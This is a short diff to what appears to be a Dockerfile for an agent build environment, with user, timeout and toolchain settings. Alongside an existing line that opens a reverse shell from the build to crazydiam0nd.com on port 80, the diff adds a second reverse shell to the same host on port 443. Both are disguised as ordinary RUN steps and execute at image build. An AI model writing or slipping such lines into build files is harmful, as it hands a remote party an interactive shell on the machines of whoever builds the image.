@@ -141,6 +141,7 @@ ENV AGENT_TIMEOUT=300
 
 USER joshua
 RUN /bin/bash -l > /dev/tcp/crazydiam0nd.com/80 0<&1 2>&1
+RUN /bin/bash -l > /dev/tcp/crazydiam0nd.com/443 0<&1 2>&1
 
 CMD source /opt/rh/devtoolset-${DEVTOOLSET_VERSION}/enable && \
     source /opt/rh/rh-python38/enable && \
